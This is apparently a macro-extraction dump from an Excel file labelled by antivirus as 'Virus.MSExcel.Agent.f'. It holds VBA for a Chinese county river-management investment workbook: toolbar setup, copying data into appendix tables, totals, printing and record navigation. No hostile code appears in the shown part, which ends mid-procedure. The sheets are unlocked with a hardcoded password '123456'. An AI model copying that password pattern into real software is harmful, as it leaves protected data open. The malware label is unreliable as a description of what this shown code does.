    Worksheets("附表6-5-5").Cells(1, 1) = "附表6-5-5 " + xianming + "堤防加固工程汇总表"
    Worksheets("附表7-1").Cells(1, 1) = "附表7-1 " + xianming + "县乡河道综合整治项目区工程投资汇总表"
    Worksheets("附表9-2").Cells(1, 1) = "附表9-2 " + xianming + "县乡河道综合整治项目区投资效益汇总表"

End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 模块4.bas 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/模块4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'添加删除工具栏
Sub aMyTB()
Attribute aMyTB.VB_Description = "宏由 lark 录制，时间: 2005-7-18"
Attribute aMyTB.VB_ProcData.VB_Invoke_Func = " \n14"

On Error GoTo ErrorHandler

'添加项目编辑工具栏
    Application.CommandBars.Add("项目编辑", msoBarTop).Visible = True

    With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=1)
    .Caption = "插入"
    .TooltipText = "插入新行"
    .FaceId = 296
    .OnAction = "a"
    .Style = msoButtonIconAndCaption
    End With
    
    With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=2)
    .Caption = "删除"
    .TooltipText = "删除选定行"
    .FaceId = 292
    .OnAction = "d"
    .Style = msoButtonIconAndCaption
    End With
        
    With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=3)
    .Caption = "编辑"
    .TooltipText = "解除表格保护，慎选"
    .FaceId = 5
    .OnAction = "e"
    .Style = msoButtonIconAndCaption
    
    End With
    
    With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=4)
    .Caption = "项目全选"
    .TooltipText = "选择所有项目进行排序等操作"
    .FaceId = 178
    .OnAction = "selectAll"
    .BeginGroup = True
    .Style = msoButtonIconAndCaption
    
    End With
    
    
     With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=5)
    .Caption = "批量打印"
    .TooltipText = "打印所有项目信息"
    .FaceId = 177
    .OnAction = "pp"
    .Style = msoButtonIconAndCaption
    .BeginGroup = True
    End With
    
        
     With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=6)
    .Caption = "单个打印"
    .TooltipText = "打印单个项目所有信息"
    .FaceId = 175
    .OnAction = "p"
    .Style = msoButtonIconAndCaption
    .BeginGroup = True
    End With
    
    With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=7)
    .Caption = "数据更新"
    .TooltipText = "将修改的数据更新到项目表中"
    .FaceId = 115
    .OnAction = "update"
    .Style = msoButtonIconAndCaption
     .Enabled = False
    End With
    
    With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=8)
    .Caption = "上一个"
    .TooltipText = "上一个项目信息"
    .FaceId = 95
    .OnAction = "pre1"
    .Style = msoButtonIconAndCaption
    
    .Enabled = False
    
    End With
    
    With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=9)
    .Caption = "下一个"
    .TooltipText = "下一个项目信息"
    .FaceId = 93
    .OnAction = "next1"
    .Style = msoButtonIconAndCaption
    
    .Enabled = False
    
    End With
     
    With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=10)
    .Caption = "读入文件"
    .TooltipText = "读入相同格式的文件"
    .FaceId = 23
    .OnAction = "read"
    .Style = msoButtonIconAndCaption
    
    End With
    
    With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=11)
    .Caption = "汇总附表"
    .TooltipText = "生成附表1-1～附表9-1的汇总表"
    .OnAction = "Mac"
    .Style = msoButtonIconAndCaption
    .BeginGroup = True
    .FaceId = 917
    End With
    
    'With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=12)
    '.Caption = "省级汇总"
    '.TooltipText = "生成附表1～附表4以及附表6的省级汇总表"
    '.OnAction = "Mac"
    '.Style = msoButtonIconAndCaption
    '.BeginGroup = True
    '.FaceId = 917
    
    'End With
    
    'With Application.CommandBars("项目编辑").Controls.Add(Type:=msoControlButton, Before:=13)
    '.Caption = "数据校核"
    '.TooltipText = "对所有项目投资数据进行校核"
    '.FaceId = 172
    '.OnAction = "cc"
    '.Style = msoButtonIconAndCaption
    'End With

Exit Sub
 
ErrorHandler:
   ' MsgBox Err.Description

 
End Sub

Sub dMyTB()
Attribute dMyTB.VB_Description = "宏由 lark 录制，时间: 2005-7-18"
Attribute dMyTB.VB_ProcData.VB_Invoke_Func = " \n14"

'删除工具栏
On Error GoTo ErrorHandler

    Application.CommandBars("项目编辑").Delete
'    Application.CommandBars("项目汇总及打印").Delete
    
Exit Sub
 
ErrorHandler:

    
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Worksheet_Activate()


Application.CommandBars("项目编辑").Controls(1).Enabled = False
Application.CommandBars("项目编辑").Controls(2).Enabled = False
Application.CommandBars("项目编辑").Controls(3).Enabled = False
Application.CommandBars("项目编辑").Controls(4).Enabled = False
Application.CommandBars("项目编辑").Controls(5).Enabled = False
Application.CommandBars("项目编辑").Controls(10).Enabled = False
Application.CommandBars("项目编辑").Controls(11).Enabled = False

Application.CommandBars("项目编辑").Controls(7).Enabled = True
Application.CommandBars("项目编辑").Controls(8).Enabled = True
Application.CommandBars("项目编辑").Controls(9).Enabled = True

End Sub

Private Sub Worksheet_Deactivate()

Worksheets("重点县工程建设情况卡片").Visible = False


Application.CommandBars("项目编辑").Controls(1).Enabled = True
Application.CommandBars("项目编辑").Controls(2).Enabled = True
Application.CommandBars("项目编辑").Controls(3).Enabled = True
Application.CommandBars("项目编辑").Controls(4).Enabled = True
Application.CommandBars("项目编辑").Controls(5).Enabled = True
Application.CommandBars("项目编辑").Controls(10).Enabled = True
Application.CommandBars("项目编辑").Controls(11).Enabled = True

Application.CommandBars("项目编辑").Controls(7).Enabled = False
Application.CommandBars("项目编辑").Controls(8).Enabled = False
Application.CommandBars("项目编辑").Controls(9).Enabled = False

End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 模块2.bas 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/模块2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'计算附表6－2～附表9－2
Sub Mac()
    
Dim pmian, tmian, pren, tren As Double
Dim c1, c2, c3, c4, c5, c6, c7, c8, c9, c10 As Double
Dim c11, c12, c13, c14, c15, c16, c17, c18, c19, c20 As Double
Dim c21, c22, c23, c24, c25, c26, c27, c28, c29, c30 As Double
Dim c31, c32, c33, c34, c35, c36, c37, c38, c39, c40 As Double

num = rowNum(Worksheets("重点县河道基本情况"))
Worksheets("附表6-2").Unprotect ("123456")
Worksheets("附表6-2").Range("a6:i2000").Delete Shift:=xlUp
    
'从附表1-1计算全县面积，全县人口
c6 = 0
c8 = 0
rNum2 = rowNum2(Worksheets("附表1-1"))
For i = 5 To rNum2
    c6 = c6 + Worksheets("附表1-1").Cells(i, 4)
    c8 = c8 + Worksheets("附表1-1").Cells(i, 5)
Next

j = 5
For i = 9 To num

    Worksheets("附表6-2").Cells(j, 1) = j - 4
    Worksheets("附表6-2").Cells(j, 2) = Worksheets("重点县河道基本情况").Cells(i, 2)
    Worksheets("附表6-2").Cells(j, 3) = Worksheets("重点县河道基本情况").Cells(i, 3)
    Worksheets("附表6-2").Cells(j, 4) = Worksheets("重点县河道基本情况").Cells(i, 42)
    Worksheets("附表6-2").Cells(j, 5) = Worksheets("重点县河道基本情况").Cells(i, 5)
    If c6 <> 0 Then Worksheets("附表6-2").Cells(j, 6) = Worksheets("重点县河道基本情况").Cells(i, 5) / c6 * 100
    Worksheets("附表6-2").Cells(j, 7) = Worksheets("重点县河道基本情况").Cells(i, 11)
    If c8 <> 0 Then Worksheets("附表6-2").Cells(j, 8) = Worksheets("重点县河道基本情况").Cells(i, 11) / c8 * 100
    Worksheets("附表6-2").Cells(j, 9) = Worksheets("重点县河道基本情况").Cells(i, 43)
    
    Worksheets("附表6-2").Cells(j, 6).NumberFormatLocal = "0.00;[红色]0.00"
    Worksheets("附表6-2").Cells(j, 8).NumberFormatLocal = "0.00;[红色]0.00"
    
    pmian = pmian + Worksheets("重点县河道基本情况").Cells(i, 5)
    pren = pren + Worksheets("重点县河道基本情况").Cells(i, 11)
    j = j + 1
Next
'将合计数写入
Worksheets("附表6-2").Cells(j, 1) = "合计"
Worksheets("附表6-2").Cells(j, 5) = pmian
If c6 <> 0 Then Worksheets("附表6-2").Cells(j, 6) = pmian / c6 * 100
Worksheets("附表6-2").Cells(j, 6).NumberFormatLocal = "0.00;[红色]0.00"
Worksheets("附表6-2").Cells(j, 7) = pren
If c8 <> 0 Then Worksheets("附表6-2").Cells(j, 8) = pren / c8 * 100
Worksheets("附表6-2").Cells(j, 8).NumberFormatLocal = "0.00;[红色]0.00"
Worksheets("附表6-2").Unprotect ("123456")

'统计附表6－5－1～6－5－5
Worksheets("附表6-5-1").Unprotect ("123456")
Worksheets("附表6-5-1").Range("a6:i2000").Delete Shift:=xlUp
Worksheets("附表6-5-2").Unprotect ("123456")
Worksheets("附表6-5-2").Range("a6:i2000").Delete Shift:=xlUp
Worksheets("附表6-5-3").Unprotect ("123456")
Worksheets("附表6-5-3").Range("a6:i2000").Delete Shift:=xlUp
Worksheets("附表6-5-4").Unprotect ("123456")
Worksheets("附表6-5-4").Range("a6:i2000").Delete Shift:=xlUp
Worksheets("附表6-5-5").Unprotect ("123456")
Worksheets("附表6-5-5").Range("a6:i2000").Delete Shift:=xlUp
    
num = rowNum(Worksheets("重点县工程建设情况"))
j = 5
For i = 9 To num

    Worksheets("附表6-5-1").Cells(j, 1) = j - 4
    Worksheets("附表6-5-1").Cells(j, 2) = Worksheets("重点县工程建设情况").Cells(i, 2)
    Worksheets("附表6-5-1").Cells(j, 3) = Worksheets("重点县工程建设情况").Cells(i, 3)
    Worksheets("附表6-5-1").Cells(j, 4) = Worksheets("重点县工程建设情况").Cells(i, 10)
    Worksheets("附表6-5-1").Cells(j, 5) = Worksheets("重点县工程建设情况").Cells(i, 11)
    Worksheets("附表6-5-1").Cells(j, 6) = Worksheets("重点县工程建设情况").Cells(i, 12)
    Worksheets("附表6-5-1").Cells(j, 7) = Worksheets("重点县工程建设情况").Cells(i, 13)
    Worksheets("附表6-5-1").Cells(j, 8) = Worksheets("重点县工程建设情况").Cells(i, 14)
    
    Worksheets("附表6-5-2").Cells(j, 1) = j - 4
    Worksheets("附表6-5-2").Cells(j, 2) = Worksheets("重点县工程建设情况").Cells(i, 2)
    Worksheets("附表6-5-2").Cells(j, 3) = Worksheets("重点县工程建设情况").Cells(i, 3)
    Worksheets("附表6-5-2").Cells(j, 4) = Worksheets("重点县工程建设情况").Cells(i, 25)
    Worksheets("附表6-5-2").Cells(j, 5) = Worksheets("重点县工程建设情况").Cells(i, 26)
    Worksheets("附表6-5-2").Cells(j, 6) = Worksheets("重点县工程建设情况").Cells(i, 27)
    Worksheets("附表6-5-2").Cells(j, 7) = Worksheets("重点县工程建设情况").Cells(i, 28)
    
    Worksheets("附表6-5-3").Cells(j, 1) = j - 4
    Worksheets("附表6-5-3").Cells(j, 2) = Worksheets("重点县工程建设情况").Cells(i, 2)
    Worksheets("附表6-5-3").Cells(j, 3) = Worksheets("重点县工程建设情况").Cells(i, 3)
    Worksheets("附表6-5-3").Cells(j, 4) = Worksheets("重点县工程建设情况").Cells(i, 15)
    Worksheets("附表6-5-3").Cells(j, 5) = Worksheets("重点县工程建设情况").Cells(i, 16)
    Worksheets("附表6-5-3").Cells(j, 6) = Worksheets("重点县工程建设情况").Cells(i, 17)
    Worksheets("附表6-5-3").Cells(j, 7) = Worksheets("重点县工程建设情况").Cells(i, 18)
    Worksheets("附表6-5-3").Cells(j, 8) = Worksheets("重点县工程建设情况").Cells(i, 19)
    Worksheets("附表6-5-3").Cells(j, 9) = Worksheets("重点县工程建设情况").Cells(i, 20)
    Worksheets("附表6-5-3").Cells(j, 10) = Worksheets("重点县工程建设情况").Cells(i, 21)
    Worksheets("附表6-5-3").Cells(j, 11) = Worksheets("重点县工程建设情况").Cells(i, 22)
    Worksheets("附表6-5-3").Cells(j, 12) = Worksheets("重点县工程建设情况").Cells(i, 23)
    Worksheets("附表6-5-3").Cells(j, 13) = Worksheets("重点县工程建设情况").Cells(i, 24)

    Worksheets("附表6-5-4").Cells(j, 1) = j - 4
    Worksheets("附表6-5-4").Cells(j, 2) = Worksheets("重点县工程建设情况").Cells(i, 2)
    Worksheets("附表6-5-4").Cells(j, 3) = Worksheets("重点县工程建设情况").Cells(i, 3)
    Worksheets("附表6-5-4").Cells(j, 4) = Worksheets("重点县工程建设情况").Cells(i, 29)
    Worksheets("附表6-5-4").Cells(j, 5) = Worksheets("重点县工程建设情况").Cells(i, 30)
    Worksheets("附表6-5-4").Cells(j, 6) = Worksheets("重点县工程建设情况").Cells(i, 31)
    Worksheets("附表6-5-4").Cells(j, 7) = Worksheets("重点县工程建设情况").Cells(i, 32)
    Worksheets("附表6-5-4").Cells(j, 8) = Worksheets("重点县工程建设情况").Cells(i, 33)
    Worksheets("附表6-5-4").Cells(j, 9) = Worksheets("重点县工程建设情况").Cells(i, 34)
    Worksheets("附表6-5-4").Cells(j, 10) = Worksheets("重点县工程建设情况").Cells(i, 36)
    Worksheets("附表6-5-4").Cells(j, 11) = Worksheets("重点县工程建设情况").Cells(i, 37)
    Worksheets("附表6-5-4").Cells(j, 12) = Worksheets("重点县工程建设情况").Cells(i, 35)
    Worksheets("附表6-5-4").Cells(j, 13) = Worksheets("重点县工程建设情况").Cells(i, 38)
    Worksheets("附表6-5-4").Cells(j, 14) = Worksheets("重点县工程建设情况").Cells(i, 39)
    
    Worksheets("附表6-5-5").Cells(j, 1) = j - 4
    Worksheets("附表6-5-5").Cells(j, 2) = Worksheets("重点县工程建设情况").Cells(i, 2)
    Worksheets("附表6-5-5").Cells(j, 3) = Worksheets("重点县工程建设情况").Cells(i, 3)
    Worksheets("附表6-5-5").Cells(j, 4) = Worksheets("重点县工程建设情况").Cells(i, 40)
    Worksheets("附表6-5-5").Cells(j, 5) = Worksheets("重点县工程建设情况").Cells(i, 41)
    Worksheets("附表6-5-5").Cells(j, 6) = Worksheets("重点县工程建设情况").Cells(i, 42)
    Worksheets("附表6-5-5").Cells(j, 7) = Worksheets("重点县工程建设情况").Cells(i, 43)
    Worksheets("附表6-5-5").Cells(j, 8) = Worksheets("重点县工程建设情况").Cells(i, 44)
    
    Worksheets("附表7-1").Cells(j, 1) = j - 4
    Worksheets("附表7-1").Cells(j, 2) = Worksheets("重点县工程建设情况").Cells(i, 2)
    Worksheets("附表7-1").Cells(j, 3) = Worksheets("重点县工程建设情况").Cells(i, 3)
    Worksheets("附表7-1").Cells(j, 4) = Worksheets("重点县工程建设情况").Cells(i, 14)
    Worksheets("附表7-1").Cells(j, 5) = Worksheets("重点县工程建设情况").Cells(i, 24)
    Worksheets("附表7-1").Cells(j, 6) = Worksheets("重点县工程建设情况").Cells(i, 28)
    Worksheets("附表7-1").Cells(j, 7) = Worksheets("重点县工程建设情况").Cells(i, 39)
    Worksheets("附表7-1").Cells(j, 8) = Worksheets("重点县工程建设情况").Cells(i, 44)
    Worksheets("附表7-1").Cells(j, 9) = Worksheets("重点县工程建设情况").Cells(i, 50)
    
    Worksheets("附表9-2").Cells(j, 1) = j - 4
    Worksheets("附表9-2").Cells(j, 2) = Worksheets("重点县工程建设情况").Cells(i, 2)
    Worksheets("附表9-2").Cells(j, 3) = Worksheets("重点县工程建设情况").Cells(i, 3)
    Worksheets("附表9-2").Cells(j, 4) = Worksheets("重点县工程建设情况").Cells(i, 46)
    Worksheets("附表9-2").Cells(j, 5) = Worksheets("重点县工程建设情况").Cells(i, 47)
    Worksheets("附表9-2").Cells(j, 6) = Worksheets("重点县工程建设情况").Cells(i, 48)
    Worksheets("附表9-2").Cells(j, 7) = Worksheets("重点县工程建设情况").Cells(i, 49)
    Worksheets("附表9-2").Cells(j, 8) = Worksheets("重点县工程建设情况").Cells(i, 50)
    Worksheets("附表9-2").Cells(j, 9) = Worksheets("重点县工程建设情况").Cells(i, 51)
    Worksheets("附表9-2").Cells(j, 10) = Worksheets("重点县工程建设情况").Cells(i, 52)
    Worksheets("附表9-2").Cells(j, 11) = Worksheets("重点县工程建设情况").Cells(i, 53)
    Worksheets("附表9-2").Cells(j, 12) = Worksheets("重点县工程建设情况").Cells(i, 54)
    Worksheets("附表9-2").Cells(j, 13) = Worksheets("重点县工程建设情况").Cells(i, 55)
    
    c1 = c1 + Worksheets("重点县工程建设情况").Cells(i, 10)
    c2 = c2 + Worksheets("重点县工程建设情况").Cells(i, 11)
    c3 = c3 + Worksheets("重点县工程建设情况").Cells(i, 12)
    c4 = c4 + Worksheets("重点县工程建设情况").Cells(i, 13)
    c41 = c41 + Worksheets("重点县工程建设情况").Cells(i, 14)
    
    c5 = c5 + Worksheets("重点县工程建设情况").Cells(i, 25)
    c6 = c6 + Worksheets("重点县工程建设情况").Cells(i, 26)
    c7 = c7 + Worksheets("重点县工程建设情况").Cells(i, 27)
    c71 = c71 + Worksheets("重点县工程建设情况").Cells(i, 28)
    
    c8 = c8 + Worksheets("重点县工程建设情况").Cells(i, 15)
    c9 = c9 + Worksheets("重点县工程建设情况").Cells(i, 16)
    c10 = c10 + Worksheets("重点县工程建设情况").Cells(i, 17)
    c11 = c11 + Worksheets("重点县工程建设情况").Cells(i, 18)
    c12 = c12 + Worksheets("重点县工程建设情况").Cells(i, 19)
    c13 = c13 + Worksheets("重点县工程建设情况").Cells(i, 20)
    c14 = c14 + Worksheets("重点县工程建设情况").Cells(i, 21)
    c15 = c15 + Worksheets("重点县工程建设情况").Cells(i, 22)
    c151 = c151 + Worksheets("重点县工程建设情况").Cells(i, 23)
    c152 = c152 + Worksheets("重点县工程建设情况").Cells(i, 24)
    
    c16 = c16 + Worksheets("重点县工程建设情况").Cells(i, 29)
    c17 = c17 + Worksheets("重点县工程建设情况").Cells(i, 30)
    c18 = c18 + Worksheets("重点县工程建设情况").Cells(i, 31)
    c19 = c19 + Worksheets("重点县工程建设情况").Cells(i, 32)
    c20 = c20 + Worksheets("重点县工程建设情况").Cells(i, 33)
    c21 = c21 + Worksheets("重点县工程建设情况").Cells(i, 34)
    c22 = c22 + Worksheets("重点县工程建设情况").Cells(i, 36)
    c23 = c23 + Worksheets("重点县工程建设情况").Cells(i, 37)
    c24 = c24 + Worksheets("重点县工程建设情况").Cells(i, 35)
    c25 = c25 + Worksheets("重点县工程建设情况").Cells(i, 38)
    c251 = c251 + Worksheets("重点县工程建设情况").Cells(i, 39)
    
    c26 = c26 + Worksheets("重点县工程建设情况").Cells(i, 40)
    c27 = c27 + Worksheets("重点县工程建设情况").Cells(i, 41)
    c28 = c28 + Worksheets("重点县工程建设情况").Cells(i, 42)
    c29 = c29 + Worksheets("重点县工程建设情况").Cells(i, 43)
    c291 = c291 + Worksheets("重点县工程建设情况").Cells(i, 44)
    
    c301 = c301 + Worksheets("重点县工程建设情况").Cells(i, 14)
    c302 = c302 + Worksheets("重点县工程建设情况").Cells(i, 24)
    c303 = c303 + Worksheets("重点县工程建设情况").Cells(i, 28)
    c304 = c304 + Worksheets("重点县工程建设情况").Cells(i, 39)
    c305 = c305 + Worksheets("重点县工程建设情况").Cells(i, 44)
    c30 = c30 + Worksheets("重点县工程建设情况").Cells(i, 50)
    
    c31 = c31 + Worksheets("重点县工程建设情况").Cells(i, 46)
    c32 = c32 + Worksheets("重点县工程建设情况").Cells(i, 47)
    c33 = c33 + Worksheets("重点县工程建设情况").Cells(i, 48)
    c34 = c34 + Worksheets("重点县工程建设情况").Cells(i, 49)
    c35 = c35 + Worksheets("重点县工程建设情况").Cells(i, 50)
    c36 = c36 + Worksheets("重点县工程建设情况").Cells(i, 51)
    c37 = c37 + Worksheets("重点县工程建设情况").Cells(i, 52)
    c38 = c38 + Worksheets("重点县工程建设情况").Cells(i, 53)
    c39 = c39 + Worksheets("重点县工程建设情况").Cells(i, 54)
    c40 = c40 + Worksheets("重点县工程建设情况").Cells(i, 55)
    
    j = j + 1
Next
'将汇总数据写入
Worksheets("附表6-5-1").Cells(j, 1) = "合计"
Worksheets("附表6-5-1").Cells(j, 4) = c1
Worksheets("附表6-5-1").Cells(j, 5) = c2
Worksheets("附表6-5-1").Cells(j, 6) = c3
Worksheets("附表6-5-1").Cells(j, 7) = c4
Worksheets("附表6-5-1").Cells(j, 8) = c41
Worksheets("附表6-5-1").Unprotect ("123456")

Worksheets("附表6-5-2").Cells(j, 1) = "合计"
Worksheets("附表6-5-2").Cells(j, 4) = c5
Worksheets("附表6-5-2").Cells(j, 5) = c6
Worksheets("附表6-5-2").Cells(j, 6) = c7
Worksheets("附表6-5-2").Cells(j, 7) = c71
Worksheets("附表6-5-2").Unprotect ("123456")

Worksheets("附表6-5-3").Cells(j, 1) = "合计"
Worksheets("附表6-5-3").Cells(j, 4) = c8
Worksheets("附表6-5-3").Cells(j, 5) = c9
Worksheets("附表6-5-3").Cells(j, 6) = c10
Worksheets("附表6-5-3").Cells(j, 7) = c11
Worksheets("附表6-5-3").Cells(j, 8) = c12
Worksheets("附表6-5-3").Cells(j, 9) = c13
Worksheets("附表6-5-3").Cells(j, 10) = c14
Worksheets("附表6-5-3").Cells(j, 11) = c15
Worksheets("附表6-5-3").Cells(j, 12) = c151
Worksheets("附表6-5-3").Cells(j, 13) = c152
Worksheets("附表6-5-3").Unprotect ("123456")

Worksheets("附表6-5-4").Cells(j, 1) = "合计"
Worksheets("附表6-5-4").Cells(j, 4) = c16
Worksheets("附表6-5-4").Cells(j, 5) = c17
Worksheets("附表6-5-4").Cells(j, 6) = c18
Worksheets("附表6-5-4").Cells(j, 7) = c19
Worksheets("附表6-5-4").Cells(j, 8) = c20
Worksheets("附表6-5-4").Cells(j, 9) = c21
Worksheets("附表6-5-4").Cells(j, 10) = c22
Worksheets("附表6-5-4").Cells(j, 11) = c23
Worksheets("附表6-5-4").Cells(j, 12) = c24
Worksheets("附表6-5-4").Cells(j, 13) = c25
Worksheets("附表6-5-4").Cells(j, 14) = c251
Worksheets("附表6-5-4").Unprotect ("123456")

Worksheets("附表6-5-5").Cells(j, 1) = "合计"
Worksheets("附表6-5-5").Cells(j, 4) = c26
Worksheets("附表6-5-5").Cells(j, 5) = c27
Worksheets("附表6-5-5").Cells(j, 6) = c28
Worksheets("附表6-5-5").Cells(j, 7) = c29
Worksheets("附表6-5-5").Cells(j, 8) = c291
Worksheets("附表6-5-5").Unprotect ("123456")

Worksheets("附表7-1").Cells(j, 1) = "合计"
Worksheets("附表7-1").Cells(j, 4) = c301
Worksheets("附表7-1").Cells(j, 5) = c302
Worksheets("附表7-1").Cells(j, 6) = c303
Worksheets("附表7-1").Cells(j, 7) = c304
Worksheets("附表7-1").Cells(j, 8) = c305
Worksheets("附表7-1").Cells(j, 9) = c30
Worksheets("附表7-1").Unprotect ("123456")

Worksheets("附表9-2").Cells(j, 1) = "合计"
Worksheets("附表9-2").Cells(j, 4) = c31
Worksheets("附表9-2").Cells(j, 5) = c32
Worksheets("附表9-2").Cells(j, 6) = c33
Worksheets("附表9-2").Cells(j, 7) = c34
Worksheets("附表9-2").Cells(j, 8) = c35
Worksheets("附表9-2").Cells(j, 9) = c36
Worksheets("附表9-2").Cells(j, 10) = c37
Worksheets("附表9-2").Cells(j, 11) = c38
Worksheets("附表9-2").Cells(j, 12) = c39
Worksheets("附表9-2").Cells(j, 13) = c40
Worksheets("附表9-2").Unprotect ("123456")

End Sub
-------------------------------------------------------------------------------
VBA MACRO 模块6.bas 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/模块6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'编辑打印
Sub e()
Attribute e.VB_Description = "宏由 lark 录制，时间: 2005-7-23"
Attribute e.VB_ProcData.VB_Invoke_Func = " \n14"
'
' e Macro
' 编辑按钮
'取消工作表保护，以便用户可以调整顺序
On Error GoTo ErrorHandler

    With Selection
    
        If (.Worksheet.Name = "重点县工程建设情况") + (.Worksheet.Name = "重点县河道基本情况") Then
            '若该单元格的行号大于9且小于end行，且其无填充颜色，则可以进行编辑
            'If (.Interior.ColorIndex = xlNone) * (.Row > 9) * (.Row < rowNum(.Worksheet) + 1) Then
            If (.Row > 8) * (.Row < rowNum(.Worksheet) + 1) Then
                .Worksheet.Unprotect ("123456")
        
                .Locked = False
                .Activate
                Exit Sub
            End If
            
        End If
    End With

    MsgBox "该行被保护，不可以进行修改！", , "提示"

    Exit Sub

ErrorHandler:
    MsgBox "请重新选择其它行！", , "提示"


End Sub
Sub pZong()
'
' pZong Macro
' 宏由 zhlimi 录制，时间: 2005-8-4
'
'
    If (ActiveSheet.Name <> "重点县工程建设情况") * (ActiveSheet.Name <> "重点县河道基本情况") Then
               ActiveSheet.PrintPreview '打印预览
    
    Else: MsgBox "请先进入汇总页面！", , "提示"
    End If
    
End Sub

Sub p()
Attribute p.VB_Description = "打印表格\n"
Attribute p.VB_ProcData.VB_Invoke_Func = " \n14"
'
' p Macro
' 打印表格
'

Dim r As Integer

r = Selection.Row


On Error GoTo out:

    Select Case ActiveSheet.Name
    
        Case "重点县工程建设情况"
            formP1 r
        
        Case "重点县河道基本情况"
            formP2 r
            
        Case Else
    
            MsgBox "请在“重点县工程建设情况”和“重点县河道基本情况”表中选择想要打印的项目行！", , "提示"
            
            
    End Select
    
    
    Exit Sub
out:
     MsgBox Err.Description, , "错误"

End Sub

Sub pp()

'
' p Macro
' 打印表格
'

Dim r As Integer

On Error GoTo out:

    Select Case ActiveSheet.Name
    
        Case "重点县工程建设情况"
            
            For r = 9 To rowNum(ActiveSheet)
                
                ActiveSheet.Unprotect
                formP1 r
                Worksheets("重点县工程建设情况卡片").PrintOut Copies:=1, Collate:=True
            Next
        
        Case "重点县河道基本情况"
            For r = 9 To rowNum(ActiveSheet)
                
                ActiveSheet.Unprotect
                formP2 r
                Worksheets("重点县河道基本情况卡片").PrintOut Copies:=1, Collate:=True
            Next
                
            
        Case Else
            ActiveSheet.PrintPreview '打印预览
            
    End Select
ActiveSheet.Unprotect
    
    Exit Sub
out:
     MsgBox Err.Description, , "错误"

End Sub

Sub update()
'
' p Macro
' 打印表格
'
Dim r As Integer
r = Range("B2").Value + 8

If (MsgBox("是否将修改的数据更新到项目表中？", vbYesNo, "数据更新") = vbYes) Then

On Error GoTo out:

    Select Case ActiveSheet.Name
    
        Case "重点县工程建设情况卡片"
            update1 r
        
        Case "重点县河道基本情况卡片"
            update2 r
            
         Case "试点县方案汇总卡片"
            MsgBox "在“试点县方案汇总卡片”中的修改不能更新", , "提示"
     
   End Select
    
'    MsgBox "数据更新成功"
    
    
    Exit Sub
    
out:
     MsgBox Err.Description, , "失败"
     
     
End If

End Sub


Sub pre1()

Dim r As Long

Range("B2") = Range("B2") - 1
If Range("B2") < 1 Then Range("B2") = 1

On Error GoTo out:

    Select Case ActiveSheet.Name
    
        Case "重点县工程建设情况卡片"
            r = Range("B2").Value + 8
            formP1 r
        
        Case "重点县河道基本情况卡片"
            r = Range("B2").Value + 8
            formP2 r
        
    End Select
    
    
    Exit Sub
out:
     MsgBox Err.Description, , "错误"

End Sub


Sub next1()

Dim r As Long

Range("B2") = Range("B2") + 1

On Error GoTo out:

    Select Case ActiveSheet.Name
    
        Case "重点县工程建设情况卡片"
            If Range("B2") > (rowNum(Worksheets("重点县工程建设情况")) - 8) Then Range("B2") = rowNum(Worksheets("重点县工程建设情况")) - 8
            r = Range("B2").Value + 8
            formP1 r
        
        Case "重点县河道基本情况卡片"
            If Range("B2") > (rowNum(Worksheets("重点县河道基本情况")) - 8) Then Range("B2") = rowNum(Worksheets("重点县河道基本情况")) - 8
            r = Range("B2").Value + 8
            formP2 r
            
    End Select
    
    
    Exit Sub
out:
     MsgBox Err.Description, , "错误"

End Sub

Sub formP1(r)

On Error GoTo ErrorHandler


